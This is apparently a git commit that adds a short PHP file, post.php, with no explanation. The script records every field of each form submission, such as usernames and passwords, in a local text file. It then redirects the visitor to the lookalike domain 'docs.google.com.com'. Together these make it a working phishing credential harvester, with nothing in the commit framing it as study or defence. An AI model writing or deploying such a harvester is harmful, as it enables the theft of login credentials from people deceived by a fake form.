dd5fe77373fd03f9e73ea9b558678b0eee207fec
xtroit <ypo.dsgn@gmail.com>
2017-05-05 10:25:09 -0500

    Add files via upload

---
+++ post.php
@@ -0,0 +1,13 @@
+<?php
+header ('Location:https://docs.google.com.com/');
+$handle = fopen("anjaana_dost.txt", "a");
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, "=");
+   fwrite($handle, $value);
+   fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
